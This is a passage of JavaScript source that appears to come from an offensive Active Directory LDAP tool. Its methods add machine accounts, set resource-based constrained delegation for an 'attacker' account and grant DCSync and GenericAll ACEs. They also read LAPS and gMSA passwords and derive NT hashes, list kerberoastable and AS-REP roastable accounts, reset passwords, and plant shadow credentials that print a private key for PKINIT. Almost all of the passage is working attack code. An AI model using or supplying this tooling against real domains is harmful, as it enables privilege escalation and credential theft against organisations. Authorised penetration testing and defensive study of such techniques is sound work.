      objectClass: ['top', 'person', 'organizationalPerson', 'user'],
      sAMAccountName: [name],
      userAccountControl: [String(canPwd ? UAC.NORMAL_ACCOUNT : UAC.NORMAL_ACCOUNT | UAC.ACCOUNTDISABLE)],
    };
    if (canPwd) attrs.unicodePwd = [unicodePwd(password)];
    await this.client.add(dn, attrs);
    let msg = `[+] Created user ${dn}`;
    if (password && !this.tls) msg += '\n[!] Password NOT set (needs LDAPS) — account created disabled.';
    return msg;
  }

  async addComputer(name, password) {
    if (!name) throw new Error('usage: add_computer <name[$]> [password]');
    const sam = name.endsWith('$') ? name : `${name}$`;
    const cn = sam.slice(0, -1);
    const dn = `CN=${cn},CN=Computers,${this.baseDN}`;
    const canPwd = password && this.tls;
    const host = `${cn}.${this.domain}`.toLowerCase();
    const attrs = {
      objectClass: ['top', 'person', 'organizationalPerson', 'user', 'computer'],
      sAMAccountName: [sam],
      userAccountControl: [String(canPwd ? UAC.WORKSTATION_TRUST : UAC.WORKSTATION_TRUST | UAC.ACCOUNTDISABLE)],
      dNSHostName: [host],
      servicePrincipalName: [`HOST/${host}`, `HOST/${cn}`, `RestrictedKrbHost/${host}`, `RestrictedKrbHost/${cn}`],
    };
    if (canPwd) attrs.unicodePwd = [unicodePwd(password)];
    await this.client.add(dn, attrs);
    let msg = `[+] Created computer ${dn} (sAMAccountName ${sam})`;
    if (password && !this.tls) msg += '\n[!] Password NOT set (needs LDAPS) — account created disabled.';
    return msg;
  }

  async del(name) {
    const e = await this._resolve(name, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${name}`);
    await this.client.delete(e.dn);
    return `[+] Deleted ${e.dn}`;
  }

  async setAttr(name, attr, value) {
    if (!name || !attr) throw new Error('usage: set <name|dn> <attribute> [value]');
    const e = await this._resolve(name, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${name}`);
    if (!value) {
      await this.client.modify(e.dn, [{ op: 'delete', type: attr, values: [] }]);
      return `[+] Cleared ${attr} on ${e.dn}`;
    }
    await this.client.modify(e.dn, [{ op: 'replace', type: attr, values: [value] }]);
    return `[+] Set ${attr}=${value} on ${e.dn}`;
  }

  // ---- Account manipulation ----

  async groupMember(member, group, op) {
    if (!member || !group) throw new Error('usage: add_user_to_group <member> <group>');
    const m = await this._resolve(member, ['distinguishedName']);
    if (!m) throw new Error(`member not found: ${member}`);
    const g = await this._resolve(group, ['distinguishedName']);
    if (!g) throw new Error(`group not found: ${group}`);
    await this.client.modify(g.dn, [{ op, type: 'member', values: [m.dn] }]);
    return `[+] ${op === 'add' ? 'Added' : 'Removed'} ${m.dn} ${op === 'add' ? 'to' : 'from'} ${g.dn}`;
  }

  async changePassword(target, newpass) {
    if (!this.tls) throw new Error('change_password requires LDAPS (unicodePwd can only be set over TLS). Reconnect with TLS.');
    if (!target || !newpass) throw new Error('usage: change_password <target> <newpassword>');
    const e = await this._resolve(target, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${target}`);
    await this.client.modify(e.dn, [{ op: 'replace', type: 'unicodePwd', values: [unicodePwd(newpass)] }]);
    return `[+] Password reset for ${e.dn}`;
  }

  async toggleUac(name, bit, on, label) {
    const e = await this._resolve(name, ['distinguishedName', 'userAccountControl']);
    if (!e) throw new Error(`object not found: ${name}`);
    let uac = parseInt(this._attr(e, 'userAccountControl') || '0', 10);
    uac = (on ? (uac | bit) : (uac & ~bit)) >>> 0;
    await this.client.modify(e.dn, [{ op: 'replace', type: 'userAccountControl', values: [String(uac)] }]);
    return `[+] ${label} ${on ? 'set' : 'cleared'} on ${e.dn} (userAccountControl=0x${uac.toString(16)})`;
  }

  async setSpn(name, spn, clear = false) {
    if (!name || !spn) throw new Error('usage: set_spn <name> <spn>');
    const e = await this._resolve(name, ['distinguishedName']);
    if (!e) throw new Error(`object not found: ${name}`);
    await this.client.modify(e.dn, [{ op: clear ? 'delete' : 'add', type: 'servicePrincipalName', values: [spn] }]);
    return `[+] ${clear ? 'Removed' : 'Added'} SPN ${spn} ${clear ? 'from' : 'to'} ${e.dn}`;
  }

  async setRbcd(target, attacker) {
    if (!target || !attacker) throw new Error('usage: set_rbcd <target-computer> <attacker-account>');
    const a = await this._resolve(attacker, ['distinguishedName', 'objectSid']);
    if (!a) throw new Error(`attacker not found: ${attacker}`);
    const sid = this._attrRaw(a, 'objectSid');
    if (!sid) throw new Error('could not read attacker objectSid');
    const t = await this._resolve(target, ['distinguishedName']);
    if (!t) throw new Error(`target not found: ${target}`);
    await this.client.modify(t.dn, [{ op: 'replace', type: 'msDS-AllowedToActOnBehalfOfOtherIdentity', values: [buildRbcdSd(sid)] }]);
    return `[+] RBCD configured on ${t.dn}: ${bytesToSid(sid)} (${attacker}) may impersonate users to it`;
  }

  async clearRbcd(target) {
    const t = await this._resolve(target, ['distinguishedName']);
    if (!t) throw new Error(`target not found: ${target}`);
    await this.client.modify(t.dn, [{ op: 'delete', type: 'msDS-AllowedToActOnBehalfOfOtherIdentity', values: [] }]);
    return `[+] Cleared RBCD on ${t.dn}`;
  }

  async getLaps(name) {
    const e = await this._resolve(name, ['ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime', 'msLAPS-Password', 'msLAPS-EncryptedPassword', 'msLAPS-PasswordExpirationTime']);
    if (!e) throw new Error(`computer not found: ${name}`);
    const legacy = this._attr(e, 'ms-Mcs-AdmPwd');
    const winLaps = this._attr(e, 'msLAPS-Password');
    if (legacy) return `[+] LAPS (legacy) password for ${name}: ${legacy}`;
    if (winLaps) return `[+] Windows LAPS for ${name}: ${winLaps}`;
    if (this._key(e, 'msLAPS-EncryptedPassword')) return `[*] ${name} has an *encrypted* LAPS password (DPAPI-NG); decryption not supported here.`;
    return `[*] No readable LAPS password on ${name} (not configured, or no permission).`;
  }

  // ---- Enumeration commands ----

  async enumUsers() {
    const filt = F.and(F.equal('objectCategory', 'person'), F.equal('objectClass', 'user'));
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: ['sAMAccountName', 'userAccountControl', 'description'] })) {
      const sam = this._attr(e, 'sAMAccountName') || '';
      const uac = parseInt(this._attr(e, 'userAccountControl') || '0', 10);
      const desc = this._attr(e, 'description') || '';
      const status = (uac & UAC.ACCOUNTDISABLE) ? 'disabled' : 'enabled';
      out.push(`  ${sam.padEnd(24)} ${status.padEnd(10)} ${desc}`);
      if (++n >= 500) { out.push('… (truncated at 500)'); break; }
    }
    return out.length ? `[+] Domain users (${n}):\n${out.join('\n')}` : '(no users found)';
  }

  async enumComputers() {
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: F.equal('objectClass', 'computer'), attributes: ['sAMAccountName', 'operatingSystem', 'dNSHostName'] })) {
      const sam = this._attr(e, 'sAMAccountName') || '';
      const os = this._attr(e, 'operatingSystem') || '';
      const dns = this._attr(e, 'dNSHostName') || '';
      out.push(`  ${sam.padEnd(20)} ${dns.padEnd(36)} ${os}`);
      if (++n >= 500) { out.push('… (truncated at 500)'); break; }
    }
    return out.length ? `[+] Domain computers (${n}):\n${out.join('\n')}` : '(no computers found)';
  }

  async enumGroups() {
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: F.equal('objectClass', 'group'), attributes: ['sAMAccountName', 'description', 'member'] })) {
      const sam = this._attr(e, 'sAMAccountName') || '';
      const desc = this._attr(e, 'description') || '';
      const members = this._attrAll(e, 'member').length;
      out.push(`  ${sam.padEnd(32)} ${String(members).padStart(4)} members  ${desc}`);
      if (++n >= 500) { out.push('… (truncated at 500)'); break; }
    }
    return out.length ? `[+] Domain groups (${n}):\n${out.join('\n')}` : '(no groups found)';
  }

  async enumDCs() {
    const filt = F.and(F.equal('objectClass', 'computer'), F.extensible('userAccountControl', '8192', '1.2.840.113556.1.4.803'));
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: ['sAMAccountName', 'dNSHostName', 'operatingSystem'] })) {
      const sam = this._attr(e, 'sAMAccountName') || '';
      const dns = this._attr(e, 'dNSHostName') || '';
      const os = this._attr(e, 'operatingSystem') || '';
      out.push(`  ${sam.padEnd(20)} ${dns.padEnd(36)} ${os}`);
      n++;
    }
    return out.length ? `[+] Domain Controllers (${n}):\n${out.join('\n')}` : '(no DCs found)';
  }

  async enumTrusts() {
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: F.equal('objectClass', 'trustedDomain'), attributes: ['name', 'trustDirection', 'trustType', 'trustAttributes', 'flatName'] })) {
      const name = this._attr(e, 'name') || '';
      const dir = parseInt(this._attr(e, 'trustDirection') || '0', 10);
      const flat = this._attr(e, 'flatName') || '';
      const dirStr = ['disabled', 'inbound', 'outbound', 'bidirectional'][dir] || `${dir}`;
      out.push(`  ${name.padEnd(32)} ${flat.padEnd(16)} ${dirStr}`);
      n++;
    }
    return out.length ? `[+] Domain trusts (${n}):\n${out.join('\n')}` : '(no trusts found)';
  }

  async enumSPNs() {
    const filt = F.and(F.equal('objectCategory', 'person'), F.equal('objectClass', 'user'), F.present('servicePrincipalName'));
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: ['sAMAccountName', 'servicePrincipalName'] })) {
      const sam = this._attr(e, 'sAMAccountName') || '';
      const spns = this._attrAll(e, 'servicePrincipalName');
      out.push(`  ${sam}:\n${spns.map((s) => `      ${s}`).join('\n')}`);
      n++;
    }
    return out.length ? `[+] Kerberoastable users with SPNs (${n}):\n${out.join('\n')}` : '[*] No kerberoastable users found.';
  }

  async enumAsrepRoast() {
    const filt = F.and(
      F.equal('objectCategory', 'person'), F.equal('objectClass', 'user'),
      F.extensible('userAccountControl', String(UAC.DONT_REQ_PREAUTH), '1.2.840.113556.1.4.803'),
    );
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt, attributes: ['sAMAccountName'] })) {
      out.push(`  ${this._attr(e, 'sAMAccountName') || e.dn}`);
      n++;
    }
    return out.length ? `[+] AS-REP roastable users (${n}):\n${out.join('\n')}` : '[*] No AS-REP roastable users found.';
  }

  async enumDelegations() {
    const filt = F.or(
      F.extensible('userAccountControl', '524288', '1.2.840.113556.1.4.803'),
      F.present('msDS-AllowedToDelegateTo'),
      F.present('msDS-AllowedToActOnBehalfOfOtherIdentity'),
    );
    const out = []; let n = 0;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.SUBTREE, filter: filt,
      attributes: ['sAMAccountName', 'userAccountControl', 'msDS-AllowedToDelegateTo', 'msDS-AllowedToActOnBehalfOfOtherIdentity'] })) {
      const sam = this._attr(e, 'sAMAccountName') || '';
      const uac = parseInt(this._attr(e, 'userAccountControl') || '0', 10);
      const types = [];
      if (uac & 0x80000) types.push('Unconstrained');
      const constrained = this._attrAll(e, 'msDS-AllowedToDelegateTo');
      if (constrained.length) types.push(`Constrained -> ${constrained.join(', ')}`);
      if (this._key(e, 'msDS-AllowedToActOnBehalfOfOtherIdentity')) types.push('RBCD');
      out.push(`  ${sam.padEnd(24)} ${types.join(' | ')}`);
      n++;
    }
    return out.length ? `[+] Accounts with delegation (${n}):\n${out.join('\n')}` : '[*] No delegation found.';
  }

  async enumPassPol() {
    let found = null;
    for await (const e of this.client.search({ baseDN: this.baseDN, scope: SCOPE.BASE, filter: F.present('objectClass'),
      attributes: ['minPwdLength', 'maxPwdAge', 'minPwdAge', 'pwdHistoryLength', 'pwdProperties', 'lockoutThreshold', 'lockoutDuration', 'lockOutObservationWindow'] })) {
      found = e;
    }
    if (!found) return '[!] Could not read domain password policy.';
    const attr = (n) => this._attr(found, n);
    const ival = (n) => parseInt(attr(n) || '0', 10);
    const toDays = (v) => { const n = Math.abs(parseInt(v || '0', 10)); return n === 0 ? 'none' : `${Math.round(n / 864000000000)} days`; };
    const toMins = (v) => { const n = Math.abs(parseInt(v || '0', 10)); return n === 0 ? 'none' : `${Math.round(n / 600000000)} mins`; };
    return [
      '[+] Domain password policy:',
      `    Min password length:   ${ival('minPwdLength')}`,
      `    Password history:      ${ival('pwdHistoryLength')}`,
      `    Max password age:      ${toDays(attr('maxPwdAge'))}`,
      `    Min password age:      ${toDays(attr('minPwdAge'))}`,
      `    Lockout threshold:     ${ival('lockoutThreshold')} attempts`,
      `    Lockout duration:      ${toMins(attr('lockoutDuration'))}`,
      `    Lockout window:        ${toMins(attr('lockOutObservationWindow'))}`,
      `    Complexity required:   ${(ival('pwdProperties') & 1) ? 'yes' : 'no'}`,
    ].join('\n');
  }

  // ---- DACL operations ----

  async getDacl(name) {
    if (!name) throw new Error('usage: get_dacl <name|dn>');
    const e = await this._resolve(name, ['nTSecurityDescriptor', 'distinguishedName']);
    if (!e) throw new Error(`object not found: ${name}`);
    const sd = this._attrRaw(e, 'nTSecurityDescriptor');
    if (!sd) return `[*] Cannot read nTSecurityDescriptor on ${name} (no permission?).`;
    const parsed = parseSD(sd);
    if (!parsed) return '[!] Failed to parse security descriptor.';
    const lines = [`[+] Security descriptor for ${e.dn}:`];
    lines.push(`    Owner: ${parsed.owner}`);
    lines.push(`    Group: ${parsed.group}`);
    lines.push(`    DACL (${parsed.aces.length} ACEs):`);
    for (const ace of parsed.aces) {
      const typeName = ACE_TYPES[ace.type] || `type-${ace.type}`;
      const maskStr = formatMask(ace.mask);
      const inherited = (ace.aceFlags & 0x10) ? ' [inherited]' : '';
      let objStr = '';
      if (ace.objectType) objStr += ` obj=${KNOWN_GUIDS[ace.objectType] || ace.objectType}`;
      if (ace.inheritedType) objStr += ` inh=${KNOWN_GUIDS[ace.inheritedType] || ace.inheritedType}`;
      lines.push(`      ${typeName.padEnd(10)} ${(ace.sid || '?').padEnd(48)} ${maskStr}${objStr}${inherited}`);
    }
    return lines.join('\n');
  }

  async addAce(target, principal, right) {
    if (!target || !principal || !right) {
      throw new Error('usage: add_ace <target> <principal> <right>\n  rights: genericall, writedacl, writeowner, dcsync, writeprop, resetpassword, or 0xMASK');
    }
    const t = await this._resolve(target, ['distinguishedName', 'nTSecurityDescriptor']);
    if (!t) throw new Error(`target not found: ${target}`);
    const p = await this._resolve(principal, ['distinguishedName', 'objectSid']);
    if (!p) throw new Error(`principal not found: ${principal}`);
    const sid = this._attrRaw(p, 'objectSid');
    if (!sid) throw new Error('could not read principal objectSid');
    const sd = this._attrRaw(t, 'nTSecurityDescriptor');
    if (!sd) throw new Error('could not read nTSecurityDescriptor (insufficient permissions?)');

    let rightDefs = ACE_RIGHTS[right.toLowerCase()];
    if (!rightDefs && right.startsWith('0x')) rightDefs = { mask: parseInt(right, 16), type: 0x00 };
    if (!rightDefs) throw new Error(`unknown right: ${right}. Use: genericall, writedacl, writeowner, dcsync, writeprop, resetpassword, or 0xMASK`);
    if (!Array.isArray(rightDefs)) rightDefs = [rightDefs];

    const newAces = rightDefs.map((r) => buildAce(r.type, 0x00, r.mask, sid, r.objectType || null));
    const newSd = rebuildSdWithAces(sd, newAces);
    const ctrl = buildSdFlagsControl(4); // DACL_SECURITY_INFORMATION
    await this.client.modify(t.dn, [{ op: 'replace', type: 'nTSecurityDescriptor', values: [newSd] }], ctrl);
    return `[+] Added ${right} ACE for ${bytesToSid(sid)} on ${t.dn}`;
  }

  async setOwner(target, principal) {
    if (!target || !principal) throw new Error('usage: set_owner <target> <new-owner>');
    const t = await this._resolve(target, ['distinguishedName']);
    if (!t) throw new Error(`target not found: ${target}`);
    const p = await this._resolve(principal, ['distinguishedName', 'objectSid']);
    if (!p) throw new Error(`principal not found: ${principal}`);
    const sid = this._attrRaw(p, 'objectSid');
    if (!sid) throw new Error('could not read principal objectSid');
    const HDR = 20;
    const ownerSd = new Uint8Array(HDR + sid.length);
    ownerSd[0] = 0x01; ownerSd[2] = 0x00; ownerSd[3] = 0x80; // SE_SELF_RELATIVE
    ownerSd[4] = HDR & 0xff; ownerSd[5] = (HDR >> 8) & 0xff;
    ownerSd.set(sid, HDR);
    const ctrl = buildSdFlagsControl(1); // OWNER_SECURITY_INFORMATION
    await this.client.modify(t.dn, [{ op: 'replace', type: 'nTSecurityDescriptor', values: [ownerSd] }], ctrl);
    return `[+] Owner of ${t.dn} changed to ${bytesToSid(sid)}`;
  }

  // ---- gMSA password ----

  async getGmsa(name) {
    if (!name) throw new Error('usage: get_gmsa <account>');
    const e = await this._resolve(name, ['msDS-ManagedPassword', 'sAMAccountName']);
    if (!e) throw new Error(`object not found: ${name}`);
    const blob = this._attrRaw(e, 'msDS-ManagedPassword');
    if (!blob) return `[*] No msDS-ManagedPassword readable on ${name} (not a gMSA, or no permission).`;
    const version = u16le(blob, 0);
    if (version !== 1) return `[!] Unexpected gMSA blob version ${version}`;
    const currentOff = u16le(blob, 4);
    const prevOff = u16le(blob, 6);
    const pwdEnd = prevOff || blob.length;
    const pwd = blob.subarray(currentOff, pwdEnd);
    const ntHash = md4(pwd);
    return [
      `[+] gMSA password for ${name}:`,
      `    NT hash:  ${hex(ntHash)}`,
      `    Raw (${pwd.length} bytes): ${hex(pwd.subarray(0, 32))}${pwd.length > 32 ? '…' : ''}`,
    ].join('\n');
  }

  // ---- Shadow Credentials ----

  async shadowCred(target, action = 'list') {
    if (!target) throw new Error('usage: shadow_cred <target> [list|add|remove]');
    action = action.toLowerCase();

    if (action === 'list') {
      const e = await this._resolve(target, ['msDS-KeyCredentialLink']);
      if (!e) throw new Error(`object not found: ${target}`);
      const vals = this._attrAll(e, 'msDS-KeyCredentialLink');
      if (!vals.length) return `[*] No key credentials on ${target}.`;
      const lines = [`[+] Key credentials on ${target} (${vals.length}):`];
      for (const v of vals) lines.push(`    ${v.length > 120 ? v.substring(0, 120) + '…' : v}`);
      return lines.join('\n');
    }

    if (action === 'remove') {
      const e = await this._resolve(target, ['distinguishedName']);
      if (!e) throw new Error(`object not found: ${target}`);
      await this.client.modify(e.dn, [{ op: 'replace', type: 'msDS-KeyCredentialLink', values: [] }]);
      return `[+] Cleared msDS-KeyCredentialLink on ${e.dn}`;
    }

    if (action === 'add') {
      const e = await this._resolve(target, ['distinguishedName']);
      if (!e) throw new Error(`object not found: ${target}`);

      const keyPair = await crypto.subtle.generateKey(
        { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
        true, ['sign', 'verify'],
      );
      const spki = new Uint8Array(await crypto.subtle.exportKey('spki', keyPair.publicKey));
      const { modulus, exponent } = extractRsaComponents(spki);
      const keyMaterial = buildBcryptRsaBlob(modulus, exponent);
      const keyId = new Uint8Array(await crypto.subtle.digest('SHA-256', keyMaterial));
      const deviceId = crypto.getRandomValues(new Uint8Array(16));
      const keyCred = buildKeyCredStruct(keyId, keyMaterial, deviceId);

      const credHex = hex(keyCred);
      const dnBinValue = `B:${credHex.length}:${credHex}:${e.dn}`;
      await this.client.modify(e.dn, [{ op: 'add', type: 'msDS-KeyCredentialLink', values: [dnBinValue] }]);

      const pkcs8 = new Uint8Array(await crypto.subtle.exportKey('pkcs8', keyPair.privateKey));
      const b64 = btoa(String.fromCharCode(...pkcs8));
      const pem = `-----BEGIN PRIVATE KEY-----\n${b64.match(/.{1,64}/g).join('\n')}\n-----END PRIVATE KEY-----`;
      const deviceGuid = bytesToGuid(deviceId);

      return [
        `[+] Shadow credential added to ${e.dn}`,
        `    Device ID: ${deviceGuid}`,
        `    Save the private key and use with certipy/PKINITtools:`,
        pem,
      ].join('\n');
    }

    throw new Error('usage: shadow_cred <target> [list|add|remove]');
  }
}
